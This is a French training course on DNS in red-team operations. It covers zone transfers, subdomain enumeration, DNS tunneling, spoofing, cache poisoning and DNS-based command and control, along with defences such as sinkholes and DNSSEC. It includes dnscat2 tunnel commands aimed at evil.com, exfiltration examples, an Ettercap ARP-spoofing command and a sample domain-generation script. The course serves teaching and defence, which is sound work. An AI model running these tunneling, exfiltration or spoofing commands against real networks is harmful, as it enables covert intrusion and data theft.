# DNS dans les opérations Red Team

## Introduction

Le DNS est à la fois un outil et une cible pour les attaquants.   
Sa nature omniprésente et le fait qu'il soit rarement bloqué par les pare-feux en font un vecteur d'attaque privilégié.    
Ce cours explore les techniques offensives utilisant le DNS et les défenses associées.

Ce cours couvre :
- La reconnaissance via DNS (zone transfer, énumération de sous-domaines)
- Le DNS tunneling pour l'exfiltration de données
- Le DNS spoofing et le cache poisoning
- L'utilisation du DNS pour le Command & Control (C2)
- Les stratégies de défense

---

## Glossaire

| Terme | Description |
|-------|-------------|
| **Red Team** | Équipe simulant des attaquants pour tester la sécurité |
| **Blue Team** | Équipe de défense et de détection |
| **C2 / C&C** | Command & Control, infrastructure de contrôle des machines compromises |
| **Exfiltration** | Extraction non autorisée de données hors du réseau |
| **AXFR** | Transfert de zone DNS complet |
| **IXFR** | Transfert de zone DNS incrémental |
| **DNS Tunneling** | Encapsulation de données dans des requêtes/réponses DNS |
| **DNS Spoofing** | Falsification de réponses DNS |
| **Cache Poisoning** | Injection de faux enregistrements dans le cache DNS |
| **DNSSEC** | Extensions de sécurité DNS (signature cryptographique) |
| **DoH** | DNS over HTTPS |
| **DoT** | DNS over TLS |
| **Passive DNS** | Base de données historique des résolutions DNS |
| **OSINT** | Open Source Intelligence, renseignement en sources ouvertes |

---

## Reconnaissance DNS

### Pourquoi le DNS est précieux pour la reconnaissance

Le DNS révèle des informations sur l'infrastructure cible :
- Sous-domaines et services exposés
- Serveurs mail, VPN, applications internes
- Technologies utilisées (cloud providers, CDN)
- Environnements de développement/test potentiellement vulnérables

### 1. Transfert de zone (AXFR)

#### Principe

Le transfert de zone est un mécanisme légitime permettant aux serveurs DNS secondaires de synchroniser leurs données avec le serveur primaire. Si mal configuré, un attaquant peut récupérer **tous les enregistrements** d'une zone.

#### Tentative de transfert de zone

```bash
# Identifier les serveurs DNS de la cible
dig NS exemple.com

# Tenter un transfert de zone sur chaque serveur NS
dig axfr exemple.com @ns1.exemple.com
dig axfr exemple.com @ns2.exemple.com

# Alternative avec host
host -l exemple.com ns1.exemple.com
```

#### Exemple de résultat (si vulnérable)

```
exemple.com.           3600    IN    SOA    ns1.exemple.com. admin.exemple.com. ...
exemple.com.           3600    IN    NS     ns1.exemple.com.
exemple.com.           3600    IN    NS     ns2.exemple.com.
exemple.com.           3600    IN    A      93.184.216.34
www.exemple.com.       3600    IN    A      93.184.216.34
mail.exemple.com.      3600    IN    A      93.184.216.35
dev.exemple.com.       3600    IN    A      10.0.1.50        ← Environnement interne exposé
admin.exemple.com.     3600    IN    A      93.184.216.36    ← Panel d'administration
vpn.exemple.com.       3600    IN    A      93.184.216.37    ← Point d'entrée VPN
backup.exemple.com.    3600    IN    A      93.184.216.38    ← Serveur de sauvegarde
```

#### Impact

| Information obtenue | Utilisation offensive |
|---------------------|----------------------|
| Liste complète des sous-domaines | Cartographie de la surface d'attaque |
| Adresses IP internes | Identification de cibles pour pivot |
| Serveurs de développement/test | Cibles potentiellement moins sécurisées |
| Infrastructure mail/VPN | Vecteurs d'entrée prioritaires |

#### Mitigation

```
# Configuration BIND pour restreindre les transferts de zone
zone "exemple.com" {
    type master;
    file "/etc/bind/zones/exemple.com.zone";
    allow-transfer { 192.168.1.2; 192.168.1.3; };  // Uniquement les secondaires autorisés
    // Ou pour bloquer complètement :
    // allow-transfer { none; };
};
```

### 2. Énumération de sous-domaines

#### Techniques

| Méthode | Description | Détectabilité |
|---------|-------------|---------------|
| **Bruteforce** | Tester une wordlist de sous-domaines | Élevée (nombreuses requêtes) |
| **Passive DNS** | Interroger des bases historiques | Aucune (pas de requête vers la cible) |
| **Certificate Transparency** | Analyser les certificats SSL émis | Aucune |
| **Moteurs de recherche** | Google dorks, Shodan, Censys | Aucune |

#### Outils d'énumération

```bash
# Sublist3r - Énumération passive et active
sublist3r -d exemple.com

# Amass - Très complet
amass enum -d exemple.com

# Subfinder - Rapide, sources passives
subfinder -d exemple.com

# DNSRecon - Multiple techniques
dnsrecon -d exemple.com

# Fierce - Bruteforce
fierce --domain exemple.com

# Gobuster en mode DNS
gobuster dns -d exemple.com -w /usr/share/wordlists/subdomains.txt
```

#### Sources passives interrogées par ces outils

- VirusTotal
- SecurityTrails
- Censys
- Shodan
- Certificate Transparency logs
- Wayback Machine
- DNSDumpster

#### Sous-domaines intéressants à rechercher

| Pattern | Intérêt |
|---------|---------|
| admin, administrator, panel | Interfaces d'administration |
| dev, development, staging, test, uat | Environnements moins sécurisés |
| api, api-v1, api-dev | Points d'entrée API |
| vpn, remote, gateway | Accès distants |
| mail, smtp, webmail, owa | Infrastructure email |
| ftp, sftp, backup | Transfert de fichiers |
| db, database, mysql, postgres | Bases de données |
| jenkins, gitlab, jira, confluence | Outils DevOps |
| internal, intranet, corp | Ressources internes |

#### Mitigation

- Supprimer les sous-domaines inutilisés
- Ne pas utiliser de noms prévisibles pour les ressources sensibles
- Implémenter une authentification sur tous les sous-domaines
- Surveiller les certificats émis via Certificate Transparency

### 3. Analyse des enregistrements DNS

#### Informations exploitables

```bash
# Serveurs mail (cibles pour phishing, brute force)
dig MX exemple.com

# Enregistrements TXT (SPF, DKIM - comprendre la politique email)
dig TXT exemple.com

# Serveurs DNS (cibles potentielles)
dig NS exemple.com

# IPv6 (surface d'attaque supplémentaire)
dig AAAA exemple.com
```

#### Analyse SPF pour le phishing

```bash
dig TXT exemple.com +short
"v=spf1 include:_spf.google.com include:sendgrid.net ~all"
```

Cette information révèle :
- L'entreprise utilise Google Workspace
- SendGrid est utilisé pour les emails marketing
- Le `~all` (soft fail) peut permettre le spoofing

### 4. Passive DNS et historique

#### Principe

Les bases Passive DNS enregistrent les résolutions DNS observées dans le temps. Cela permet de :
- Découvrir d'anciens sous-domaines
- Identifier des changements d'infrastructure
- Trouver des domaines liés

#### Outils et services

| Service | URL | Type |
|---------|-----|------|
| SecurityTrails | securitytrails.com | Commercial (API gratuite limitée) |
| VirusTotal | virustotal.com | Gratuit |
| PassiveTotal | community.riskiq.com | Commercial |
| DNSDumpster | dnsdumpster.com | Gratuit |
| Robtex | robtex.com | Gratuit |

---

## DNS Tunneling

### Principe

Le DNS tunneling consiste à **encapsuler des données arbitraires** dans des requêtes et réponses DNS. Comme le DNS est rarement bloqué, cette technique permet de :
- Exfiltrer des données
- Établir un canal C2
- Contourner les portails captifs (Wi-Fi)

### Fonctionnement

```
┌─────────────────┐                              ┌─────────────────┐
│ Machine         │                              │ Serveur         │
│ compromise      │                              │ attaquant       │
│                 │                              │ (DNS autoritaire│
│                 │                              │  pour evil.com) │
└────────┬────────┘                              └────────┬────────┘
         │                                                │
         │  ① Requête DNS :                               │
         │  ZXhmaWx0cmF0ZWQ.data.evil.com                 │
         │  (données encodées en base64)                  │
         ├───────────────────────────────────────────────►│
         │                                                │
         │  ② Réponse DNS :                               │
         │  TXT "Y29tbWFuZA==" (commande encodée)         │
         │◄───────────────────────────────────────────────┤
         │                                                │
```

#### Encodage des données

Les données sont encodées dans les sous-domaines (max ~63 caractères par label, ~253 total) :

```
Données à exfiltrer : "password123"
Encodé base32 : OBWGC2LOFZRW6ZDF
Requête : OBWGC2LOFZRW6ZDF.exfil.evil.com
```

### Outils de DNS tunneling

| Outil | Langage | Caractéristiques |
|-------|---------|------------------|
| **iodine** | C | Tunnel IP complet, très performant |
| **dnscat2** | Ruby/C | C2 complet avec shell, transfert de fichiers |
| **DNSExfiltrator** | PowerShell/Python | Exfiltration de fichiers |
| **Cobalt Strike** | Java | Module DNS beacon intégré |

#### Exemple avec dnscat2

**Côté serveur (attaquant)** :
```bash
# Lancer le serveur dnscat2 (nécessite contrôle du DNS pour evil.com)
ruby dnscat2.rb evil.com
```

**Côté client (machine compromise)** :
```bash
# Établir le tunnel
./dnscat evil.com
```

### Indicateurs de DNS tunneling

| Indicateur | Description |
|------------|-------------|
| Requêtes vers des domaines inhabituels | Domaines nouvellement enregistrés ou suspects |
| Volume élevé de requêtes DNS | Bien au-delà du trafic normal |
| Sous-domaines très longs | Encodage de données (>30 caractères) |
| Entropie élevée des sous-domaines | Chaînes aléatoires (base64, hex) |
| Types de requêtes inhabituels | TXT, NULL, CNAME excessifs |
| Requêtes régulières (beacon) | Pattern temporel suspect |

### Détection et mitigation

```bash
# Analyser les requêtes DNS avec tcpdump
tcpdump -i eth0 port 53 -w dns_capture.pcap

# Identifier les domaines suspects avec Zeek/Bro
zeek -r dns_capture.pcap

# Outils de détection spécialisés
# - Passive DNS monitoring
# - Machine learning sur les patterns DNS
```

**Contre-mesures** :

| Mesure | Description |
|--------|-------------|
| Inspection DNS | Analyser le contenu des requêtes |
| Limitation de taille | Bloquer les requêtes avec sous-domaines > 30 car |
| Liste blanche DNS | N'autoriser que les résolveurs internes |
| Analyse d'entropie | Détecter les encodages suspects |
| Rate limiting | Limiter le nombre de requêtes par client |
| Proxy DNS interne | Forcer tout le trafic DNS via un proxy analysé |

---

## DNS Spoofing et Cache Poisoning

### Principe

Le DNS spoofing consiste à **falsifier les réponses DNS** pour rediriger les victimes vers des serveurs malveillants.

### Types d'attaques

#### 1. Spoofing local (même réseau)

L'attaquant intercepte les requêtes DNS sur le réseau local et répond avant le serveur légitime.

```
                    ┌─────────────────┐
                    │  Serveur DNS    │
                    │  légitime       │
                    └────────┬────────┘
                             │
                             │ ③ Vraie réponse
                             │   (arrive trop tard,
                             │    ignorée)
                             ▼
┌────────────┐  ① Requête   ┌─────────────────┐
│  Victime   │─────────────►│   Réseau local  │
│            │◄─────────────│   (broadcast)   │
└─────┬──────┘  ② Fausse    └─────────────────┘
      │            réponse          ▲
      │            (rapide)         │
      │                        ┌────┴────┐
      │                        │Attaquant│
      │                        │(écoute) │
      │                        └─────────┘
      │
      │ ④ La victime croit que
      │    exemple.com = IP malveillante
      ▼
┌─────────────┐
│  Serveur    │
│  malveillant│
│  (IP fausse)│
└─────────────┘
```

**Déroulement** :
1. La victime envoie une requête DNS (ex: "exemple.com ?")
2. L'attaquant, sur le même réseau, voit la requête et envoie immédiatement une fausse réponse avec une IP qu'il contrôle
3. La vraie réponse du serveur DNS arrive après, mais elle est ignorée (la victime a déjà reçu une réponse)
4. La victime se connecte à l'IP malveillante en pensant accéder au site légitime

**Outils** : Ettercap, Bettercap, dnsspoof

```bash
# Avec Ettercap
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
# Puis activer le plugin dns_spoof avec un fichier de configuration
```

#### 2. Cache Poisoning

Injection de faux enregistrements dans le cache d'un résolveur DNS.

**Attaque de Kaminsky (2008)** :
1. L'attaquant envoie de nombreuses requêtes pour des sous-domaines aléatoires
2. Simultanément, il envoie des réponses falsifiées avec le bon Transaction ID
3. Si une réponse falsifiée est acceptée, le cache est empoisonné

### Impact

| Scénario | Impact |
|----------|--------|
| Redirection vers site de phishing | Vol de credentials |
| Interception de trafic | Man-in-the-Middle |
| Distribution de malware | Faux site de téléchargement |
| Déni de service | Redirection vers IP inexistante |

### Protection : DNSSEC

DNSSEC signe cryptographiquement les enregistrements DNS, permettant de vérifier leur authenticité.

```bash
# Vérifier si un domaine utilise DNSSEC
dig +dnssec exemple.com

# Validation complète
dig +sigchase +trusted-key=/etc/trusted-key.key exemple.com
```

**Limites de DNSSEC** :
- Déploiement encore incomplet
- Ne chiffre pas les requêtes (confidentialité)
- Complexité de gestion des clés

---

## DNS pour le Command & Control (C2)

### Pourquoi utiliser DNS pour le C2

| Avantage | Explication |
|----------|-------------|
| Rarement bloqué | Le DNS est essentiel au fonctionnement du réseau |
| Traverse les pare-feux | Port 53 généralement ouvert |
| Difficile à détecter | Se fond dans le trafic légitime |
| Résilient | Peut utiliser plusieurs domaines (DGA) |

### Architectures C2 DNS

#### 1. DNS direct

Le malware envoie des requêtes DNS directement au serveur C2 qui fait autorité pour un domaine.

```
Malware ──► Requête : cmd.evil.com
        ◄── Réponse : TXT "execute:whoami"
```

#### 2. DNS avec DGA (Domain Generation Algorithm)

Le malware génère dynamiquement des noms de domaine basés sur la date/heure.

```python
# Exemple simplifié de DGA
import hashlib
from datetime import datetime

def generate_domain(seed, date):
    data = f"{seed}{date.strftime('%Y%m%d')}"
    hash = hashlib.md5(data.encode()).hexdigest()[:12]
    return f"{hash}.com"

# Génère un domaine différent chaque jour
domain = generate_domain("malware_seed", datetime.now())
```

**Avantage** : difficile à bloquer car les domaines changent constamment
**Contre-mesure** : reverse engineering du DGA, prédiction et blocage préventif

#### 3. Fast Flux

Changement rapide des enregistrements DNS (IP) pour un même domaine, utilisant un réseau de machines compromises comme proxies.

### Beacons DNS

Le malware "pingue" régulièrement le C2 via DNS :

```
# Pattern typique de beacon
[10:00:00] query: beacon.evil.com
[10:05:00] query: beacon.evil.com
[10:10:00] query: beacon.evil.com
...
```

**Indicateur** : requêtes régulières vers le même domaine peu commun.

### Outils C2 utilisant DNS

| Outil | Type | Caractéristiques |
|-------|------|------------------|
| Cobalt Strike | Commercial | DNS beacon, très utilisé par les APT |
| dnscat2 | Open source | Shell interactif via DNS |
| DNScat | Open source | Tunnel DNS simple |
| YOURNAME | Open source | C2 léger |

---

## Stratégies de défense

### 1. Surveillance DNS

| Mesure | Implémentation |
|--------|----------------|
| Journalisation | Activer les logs DNS sur tous les résolveurs |
| SIEM | Centraliser et analyser les logs DNS |
| Alertes | Détecter les patterns suspects (volume, entropie, domaines) |
| Baseline | Établir un comportement DNS "normal" |

### 2. Contrôle du trafic DNS

```
# Forcer l'utilisation du résolveur interne (iptables)
iptables -A OUTPUT -p udp --dport 53 -j REJECT
iptables -A OUTPUT -p tcp --dport 53 -j REJECT
# Exception pour le résolveur interne
iptables -I OUTPUT -p udp --dport 53 -d 192.168.1.1 -j ACCEPT
```

### 3. DNS Sinkhole

Rediriger les domaines malveillants connus vers une IP interne pour :
- Bloquer la communication C2
- Identifier les machines infectées

```
# Configuration Pi-hole / BIND
# Rediriger evil.com vers le sinkhole
zone "evil.com" {
    type master;
    file "/etc/bind/sinkhole.zone";
};

# sinkhole.zone
$TTL 86400
@   IN  SOA localhost. admin.localhost. ( 1 3600 600 86400 600 )
@   IN  NS  localhost.
@   IN  A   192.168.1.250  ; IP du sinkhole
*   IN  A   192.168.1.250
```

### 4. DNSSEC

Déployer DNSSEC pour prévenir le spoofing et le cache poisoning.

### 5. DNS chiffré (DoH/DoT)

| Avantage | Inconvénient |
|----------|--------------|
| Confidentialité des requêtes | Perte de visibilité pour la défense |
| Protection contre le spoofing local | Les attaquants peuvent aussi l'utiliser |

**Recommandation** : DoH/DoT vers un résolveur interne contrôlé, pas vers des services externes.

### 6. Threat Intelligence

Intégrer des flux de domaines malveillants :
- Listes de domaines C2 connus
- Domaines générés par DGA connus
- Domaines de phishing

### Tableau récapitulatif des défenses

| Menace | Défense |
|--------|---------|
| Zone transfer | Restreindre AXFR aux serveurs autorisés |
| Énumération | Nettoyer les sous-domaines inutiles |
| DNS tunneling | Inspection, rate limiting, analyse d'entropie |
| DNS spoofing | DNSSEC, DoT/DoH |
| C2 DNS | Surveillance, sinkhole, threat intel |

---

## Outils de référence

### Reconnaissance

| Outil | Usage |
|-------|-------|
| dig, host, nslookup | Requêtes DNS manuelles |
| dnsenum | Énumération complète |
| dnsrecon | Multiple techniques de reconnaissance |
| fierce | Bruteforce de sous-domaines |
| amass | Énumération avancée (OWASP) |
| subfinder | Énumération passive rapide |
| massdns | Résolution DNS massive |

### Attaque

| Outil | Usage |
|-------|-------|
| dnscat2 | Tunneling et C2 |
| iodine | Tunnel IP sur DNS |
| dnschef | Proxy DNS pour spoofing |
| responder | Spoofing DNS/LLMNR/NBT-NS |
| bettercap | Framework MitM incluant DNS spoofing |

### Défense

| Outil | Usage |
|-------|-------|
| passivedns | Capture passive des résolutions |
| dnstop | Monitoring DNS en temps réel |
| dnstwist | Détection de typosquatting |
| zeek (bro) | Analyse de trafic réseau incluant DNS |
| pi-hole | Filtrage DNS et sinkhole |

---

## Commandes pratiques

```bash
# === RECONNAISSANCE ===

# Transfert de zone
dig axfr cible.com @ns1.cible.com

# Énumération de sous-domaines
subfinder -d cible.com -o subdomains.txt
amass enum -passive -d cible.com

# Résolution massive
cat subdomains.txt | massdns -r resolvers.txt -o S

# Vérifier les enregistrements de sécurité email
dig TXT cible.com +short | grep -E "spf|dkim|dmarc"

# === ANALYSE ===

# Capturer le trafic DNS
tcpdump -i eth0 -w dns.pcap port 53

# Analyser avec tshark
tshark -r dns.pcap -T fields -e dns.qry.name | sort | uniq -c | sort -rn

# Détecter les requêtes longues (potentiel tunneling)
tshark -r dns.pcap -T fields -e dns.qry.name | awk 'length > 50'

# === DÉFENSE ===

# Vérifier DNSSEC
dig +dnssec cible.com

# Tester la configuration DNS
dnssec-verify -o cible.com /path/to/zone.file

# Flush du cache DNS (debug)
# Linux (systemd)
sudo systemd-resolve --flush-caches
# Windows
ipconfig /flushdns
```

---

## Ressources

| Ressource | Description |
|-----------|-------------|
| https://attack.mitre.org/techniques/T1071/004/ | MITRE ATT&CK - DNS C2 |
| https://attack.mitre.org/techniques/T1048/003/ | MITRE ATT&CK - DNS Exfiltration |
| https://github.com/iagox86/dnscat2 | dnscat2 - Outil de tunneling DNS |
| https://github.com/OWASP/Amass | Amass - Énumération de surface d'attaque |
| https://www.sans.org/white-papers/34152/ | SANS - DNS Tunneling Detection |
| https://unit42.paloaltonetworks.com | Threat Intelligence incluant DNS |
